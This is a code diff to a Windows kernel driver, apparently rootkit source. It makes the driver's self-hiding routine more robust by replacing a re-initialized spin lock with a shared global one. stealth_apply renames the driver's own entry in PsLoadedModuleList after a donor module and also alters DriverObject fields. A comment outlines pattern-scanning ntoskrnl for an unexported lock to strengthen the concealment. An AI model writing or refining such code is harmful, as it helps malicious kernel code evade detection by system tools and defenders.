@@ -135,12 +135,26 @@ static BOOLEAN is_donor_module(PKLDR_DATA_TABLE_ENTRY e) {
 NTSTATUS stealth_apply(PDRIVER_OBJECT drv) {
     PLIST_ENTRY head, cur;
     KIRQL irql;
-    static KSPIN_LOCK dummy;
     PKLDR_DATA_TABLE_ENTRY our_entry = NULL;
     PKLDR_DATA_TABLE_ENTRY donor = NULL;
 
-    KeInitializeSpinLock(&dummy);    /* Phase 1.5 fixes this re-init. */
-    KeAcquireSpinLock(&dummy, &irql);
+    /* Phase 1.5: g_stealth_lock is initialized ONCE in DriverEntry. The
+     * previous `static KSPIN_LOCK dummy; KeInitializeSpinLock(&dummy)`
+     * pattern inside each entry reset the lock on every call, so a
+     * concurrent walker could witness an incompletely-renamed KLDR
+     * entry mid-operation. Acquire without re-init.
+     *
+     * Optional hardening (NOT implemented here): resolve the unexported
+     * PsLoadedModuleResource (ERESOURCE) by pattern-scanning ntoskrnl,
+     * raise to APC_LEVEL via KeEnterCriticalRegion, acquire the resource
+     * exclusive with ExAcquireResourceExclusiveLite(..., TRUE), then
+     * raise to DISPATCH_LEVEL for this spin lock. The reverse unwind on
+     * release. That gives the strongest guarantee against the loader's
+     * own walk, at the cost of pattern-scanning a kernel internal that
+     * drifts build-to-build. The current spin-lock-only path is enough
+     * for in-tree walkers (NtQuerySystemInformation) and we accept a
+     * narrow race window against a bespoke loader-internal walker. */
+    KeAcquireSpinLock(&g_stealth_lock, &irql);
 
     head = &PsLoadedModuleList;
 
@@ -154,7 +168,7 @@ NTSTATUS stealth_apply(PDRIVER_OBJECT drv) {
         }
     }
     if (!our_entry) {
-        KeReleaseSpinLock(&dummy, irql);
+        KeReleaseSpinLock(&g_stealth_lock, irql);
         return STATUS_NOT_FOUND;
     }
 
@@ -170,7 +184,7 @@ NTSTATUS stealth_apply(PDRIVER_OBJECT drv) {
         }
     }
     if (!donor) {
-        KeReleaseSpinLock(&dummy, irql);
+        KeReleaseSpinLock(&g_stealth_lock, irql);
         return STATUS_NOT_FOUND;
     }
 
@@ -184,7 +198,7 @@ NTSTATUS stealth_apply(PDRIVER_OBJECT drv) {
     our_entry->BaseDllName = donor->BaseDllName;
     our_entry->FullDllName = donor->FullDllName;
 
-    KeReleaseSpinLock(&dummy, irql);
+    KeReleaseSpinLock(&g_stealth_lock, irql);
 
     /* DriverObject fields.
      *
@@ -225,17 +239,16 @@ NTSTATUS stealth_apply(PDRIVER_OBJECT drv) {
 
 NTSTATUS stealth_revert(PDRIVER_OBJECT drv) {
     KIRQL irql;
-    static KSPIN_LOCK dummy;
-    KeInitializeSpinLock(&dummy);    /* Phase 1.5 fixes this re-init. */
 
-    KeAcquireSpinLock(&dummy, &irql);
+    /* Phase 1.5: use the shared g_stealth_lock, no re-init. */
+    KeAcquireSpinLock(&g_stealth_lock, &irql);
     if (g_saved_entry) {
         /* Restore original BaseDllName / FullDllName in full. */
         g_saved_entry->BaseDllName = g_saved_base_dll_name;
         g_saved_entry->FullDllName = g_saved_full_dll_name;
         g_saved_entry = NULL;
     }
-    KeReleaseSpinLock(&dummy, irql);
+    KeReleaseSpinLock(&g_stealth_lock, irql);
 
     if (drv) {
         drv->DriverName    = g_saved_driver_name;
